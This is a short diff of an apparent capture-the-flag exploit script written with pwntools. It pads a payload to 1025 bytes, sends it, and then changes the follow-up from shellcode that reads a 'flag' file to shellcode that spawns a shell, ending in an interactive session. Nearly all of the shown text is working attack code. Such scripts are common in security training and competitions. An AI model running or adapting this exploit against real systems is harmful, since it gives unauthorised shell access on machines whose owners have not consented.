@@ -89,9 +89,9 @@ payload = pad + s
 #pad out to 1025, so the read exits cleanly:
 payload += '\x41'*(1025-len(payload))
 p.send(payload)
-p.send(asm(shellcraft.cat('flag')))
+#p.send(asm(shellcraft.cat('flag')))
 #or get a shell
-#p.send(asm(shellcraft.sh()))
+p.send(asm(shellcraft.sh()))
 p.interactive()
 
 
